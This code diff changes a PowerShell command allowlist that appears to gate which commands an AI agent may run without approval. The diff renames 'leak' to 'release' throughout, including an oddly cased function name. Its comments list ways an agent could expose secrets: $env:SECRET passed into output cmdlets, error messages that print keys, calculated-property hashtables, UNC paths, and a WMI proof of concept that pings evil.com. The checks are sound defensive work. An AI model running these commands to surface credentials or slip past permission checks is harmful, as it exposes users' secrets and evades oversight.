@@ -58,7 +58,7 @@ type CommandConfig = {
 /**
  * Shared callback for cmdlets that print or coerce their args to stdout/
  * stderr. `Write-Output $env:SECRET` prints it directly; `Start-Sleep
- * $env:SECRET` leaks via type-coerce error ("Cannot convert value 'sk-...'
+ * $env:SECRET` releases via type-coerce error ("Cannot convert value 'sk-...'
  * to System.Double"). Bash's echo regex WHITELISTS safe chars per token.
  *
  * Two checks:
@@ -71,9 +71,9 @@ type CommandConfig = {
  *    child, not a separate CommandElement. elementTypes = [..., 'Parameter'],
  *    whitelist passes. Query children[] for the .Argument's mapped type;
  *    anything other than StringConstant (Variable, ParenExpression wrapping
- *    arbitrary pipelines, Hashtable, etc.) is a leak vector.
+ *    arbitrary pipelines, Hashtable, etc.) is a release vector.
  */
-export function argLeaksValue(
+export function argreleasesValue(
   _cmd: string,
   element?: ParsedCommandElement,
 ): boolean {
@@ -479,14 +479,14 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // =========================================================================
     // Bash parity: `echo` is auto-allowed via custom regex (BashTool
     // readOnlyValidation.ts:~1517). That regex WHITELISTS safe chars per arg.
-    // See argLeaksValue above for the three attack shapes it blocks.
+    // See argreleasesValue above for the three attack shapes it blocks.
     'write-output': {
       safeFlags: ['-InputObject', '-NoEnumerate'],
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     // Write-Host bypasses the pipeline (Information stream, PS5+), so it's
     // strictly less capable than Write-Output — but the same
-    // `Write-Host $env:SECRET` leak-via-display applies.
+    // `Write-Host $env:SECRET` release-via-display applies.
     'write-host': {
       safeFlags: [
         '-Object',
@@ -495,86 +495,86 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         '-ForegroundColor',
         '-BackgroundColor',
       ],
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     // Bash parity: `sleep` is in READONLY_COMMANDS (BashTool
     // readOnlyValidation.ts:~1146). Zero side effects at runtime — but
-    // `Start-Sleep $env:SECRET` leaks via type-coerce error. Same guard.
+    // `Start-Sleep $env:SECRET` releases via type-coerce error. Same guard.
     'start-sleep': {
       safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     // Format-* and Measure-Object moved here from SAFE_OUTPUT_CMDLETS after
     // security review found all accept calculated-property hashtables (same
     // exploit as Where-Object — I4 regression). isSafeOutputCommand is a
     // NAME-ONLY check that filtered them out of the approval loop BEFORE arg
-    // validation. Here, argLeaksValue validates args:
+    // validation. Here, argreleasesValue validates args:
     //   | Format-Table               → no args → safe → allow
     //   | Format-Table Name, CPU     → StringConstant positionals → safe → allow
     //   | Format-Table $env:SECRET   → Variable elementType → blocked → passthrough
     //   | Format-Table @{N='x';E={}} → Other (HashtableAst) → blocked → passthrough
     //   | Measure-Object -Property $env:SECRET → same → blocked
-    // allowAllFlags: argLeaksValue validates arg elementTypes (Variable/Hashtable/
+    // allowAllFlags: argreleasesValue validates arg elementTypes (Variable/Hashtable/
     // ScriptBlock → blocked). Format-* flags themselves (-AutoSize, -GroupBy,
     // -Wrap, etc.) are display-only. Without allowAllFlags, the empty-safeFlags
     // default rejects ALL flags — `Format-Table -AutoSize` would over-prompt.
     'format-table': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     'format-list': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     'format-wide': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     'format-custom': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     'measure-object': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     // Select-Object/Sort-Object/Group-Object/Where-Object: same calculated-
     // property hashtable surface as format-* (about_Calculated_Properties).
     // Removed from SAFE_OUTPUT_CMDLETS but previously missing here, causing
-    // `Get-Process | Select-Object Name` to over-prompt. argLeaksValue handles
+    // `Get-Process | Select-Object Name` to over-prompt. argreleasesValue handles
     // them identically: StringConstant property names pass (`Select-Object Name`),
     // HashtableAst/ScriptBlock/Variable args block (`Select-Object @{N='x';E={...}}`,
     // `Where-Object { ... }`). allowAllFlags: -First/-Last/-Skip/-Descending/
     // -Property/-EQ etc. are all selection/ordering flags — harmless on their own;
-    // argLeaksValue catches the dangerous arg *values*.
+    // argreleasesValue catches the dangerous arg *values*.
     'select-object': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     'sort-object': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     'group-object': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     'where-object': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     // Out-String/Out-Host moved here from SAFE_OUTPUT_CMDLETS — both accept
-    // -InputObject which leaks the same way Write-Output does.
+    // -InputObject which releases the same way Write-Output does.
     // `Get-Process | Out-String -InputObject $env:SECRET` → secret prints.
     // allowAllFlags: -Width/-Stream/-Paging/-NoNewline are display flags;
-    // argLeaksValue catches the dangerous -InputObject *value*.
+    // argreleasesValue catches the dangerous -InputObject *value*.
     'out-string': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
     'out-host': {
       allowAllFlags: true,
-      additionalCommandIsDangerousCallback: argLeaksValue,
+      additionalCommandIsDangerousCallback: argreleasesValue,
     },
 
     // =========================================================================
@@ -664,7 +664,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // CimSession. -Class/-ClassName/-Filter/-Query accept arbitrary WMI
     // classes/WQL that we cannot statically validate.
     //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
-    //   → sends ICMP to evil.com (DNS leak + potential NTLM auth leak).
+    //   → sends ICMP to evil.com (DNS release + potential NTLM auth release).
     // WMI can also auto-load provider DLLs (init code). Removal forces prompt.
     // get-cimclass stays — only lists class metadata, no instance enumeration.
     'get-cimclass': {
@@ -887,11 +887,11 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
  */
 const SAFE_OUTPUT_CMDLETS = new Set([
   'out-null',
-  // NOT out-string/out-host — both accept -InputObject which leaks args the
-  // same way Write-Output does. Moved to CMDLET_ALLOWLIST with argLeaksValue.
+  // NOT out-string/out-host — both accept -InputObject which releases args the
+  // same way Write-Output does. Moved to CMDLET_ALLOWLIST with argreleasesValue.
   // `Get-Process | Out-String -InputObject $env:SECRET` — Out-String was
   // filtered name-only, the $env arg was never validated.
-  // out-null stays: it discards everything, no -InputObject leak.
+  // out-null stays: it discards everything, no -InputObject release.
   // NOT foreach-object / where-object / select-object / sort-object /
   // group-object / format-table / format-list / format-wide / format-custom /
   // measure-object — ALL accept calculated-property hashtables or script-block
@@ -900,7 +900,7 @@ const SAFE_OUTPUT_CMDLETS = new Set([
   //   Where-Object @{k=$env:SECRET}       — HashtableAst arg, 'Other' elementType
   //   Select-Object @{N='x';E={...}}      — calculated property scriptblock
   //   Format-Table $env:SECRET            — positional -Property, prints as header
-  //   Measure-Object -Property $env:SECRET — leaks via "property 'sk-...' not found"
+  //   Measure-Object -Property $env:SECRET — releases via "property 'sk-...' not found"
   //   ForEach-Object { $env:PATH='e' }    — arbitrary script body
   // isSafeOutputCommand is a NAME-ONLY check — step-5 filters these out of
   // the approval loop BEFORE arg validation runs. With them here, an
@@ -918,15 +918,15 @@ const SAFE_OUTPUT_CMDLETS = new Set([
 
 /**
  * Cmdlets moved from SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST with
- * argLeaksValue. These are pipeline-tail transformers (Format-*,
+ * argreleasesValue. These are pipeline-tail transformers (Format-*,
  * Measure-Object, Select-Object, etc.) that were previously name-only
- * filtered as safe-output. They now require arg validation (argLeaksValue
+ * filtered as safe-output. They now require arg validation (argreleasesValue
  * blocks calculated-property hashtables / scriptblocks / variable args).
  *
  * Used by isAllowlistedPipelineTail for the narrow fallback in
  * checkPermissionMode and isReadOnlyCommand — these callers need the same
  * "skip harmless pipeline tail" behavior as SAFE_OUTPUT_CMDLETS but with
- * the argLeaksValue guard.
+ * the argreleasesValue guard.
  */
 const PIPELINE_TAIL_CMDLETS = new Set([
   'format-table',
@@ -1043,7 +1043,7 @@ export function isSafeOutputCommand(name: string): boolean {
 /**
  * Checks if a command element is a pipeline-tail transformer that was moved
  * from SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST (PIPELINE_TAIL_CMDLETS set)
- * AND passes its argLeaksValue guard via isAllowlistedCommand.
+ * AND passes its argreleasesValue guard via isAllowlistedCommand.
  *
  * Narrow fallback for isSafeOutputCommand call sites that need to keep the
  * "skip harmless pipeline tail" behavior for Format-Table / Select-Object / etc.
@@ -1144,7 +1144,7 @@ export function hasSyncSecurityConcerns(command: string): boolean {
   }
 
   // UNC paths: \\server\share or //server/share can trigger network requests
-  // and leak NTLM/Kerberos credentials
+  // and release NTLM/Kerberos credentials
   // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() with atom search, short command strings
   if (/\\\\/.test(trimmed) || /(?<!:)\/\//.test(trimmed)) {
     return true
@@ -1264,7 +1264,7 @@ export function isReadOnlyCommand(
     // (with arg validation). Format-Table/Measure-Object moved from
     // SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST after security review found all
     // accept calculated-property hashtables. isAllowlistedCommand runs their
-    // argLeaksValue callback: bare `| Format-Table` passes, `| Format-Table
+    // argreleasesValue callback: bare `| Format-Table` passes, `| Format-Table
     // $env:SECRET` fails. SECURITY: nameType gate catches 'scripts\\Out-Null'
     // (raw name has path chars → 'application'). cmd.name is stripped to
     // 'Out-Null' which would match SAFE_OUTPUT_CMDLETS, but PowerShell runs
@@ -1352,9 +1352,9 @@ export function isAllowlistedCommand(
   //   'Variable'          → `Get-Process $env:AWS_SECRET_ACCESS_KEY` expands,
   //                         errors "Cannot find process 'sk-ant-...'", model
   //                         reads the secret from the error
-  //   'Other' (Hashtable) → `Get-Process @{k=$env:SECRET}` same leak
-  //   'Other' (Convert)   → `Get-Process [string]$env:SECRET` same leak
-  //   'Other' (BinaryExpr)→ `Get-Process ($env:SECRET + '')` same leak
+  //   'Other' (Hashtable) → `Get-Process @{k=$env:SECRET}` same release
+  //   'Other' (Convert)   → `Get-Process [string]$env:SECRET` same release
+  //   'Other' (BinaryExpr)→ `Get-Process ($env:SECRET + '')` same release
   //   'SubExpression'     → arbitrary code (already caught by deriveSecurityFlags
   //                         at the isReadOnlyCommand layer, but isAllowlistedCommand
   //                         is also called from checkPermissionMode directly)
@@ -1385,7 +1385,7 @@ export function isAllowlistedCommand(
       const t = cmd.elementTypes[i]
       if (t !== 'StringConstant' && t !== 'Parameter') {
         // ArrayLiteralAst (`Get-Process Name, Id`) maps to 'Other'. The
-        // leak vectors enumerated above all have a metachar in their extent
+        // release vectors enumerated above all have a metachar in their extent
         // text: Hashtable `@{`, Convert `[`, BinaryExpr-with-var `$`,
         // ParenExpr `(`. A bare comma-list of identifiers has none.
         if (!/[$(@{[]/.test(cmd.args[i - 1] ?? '')) {
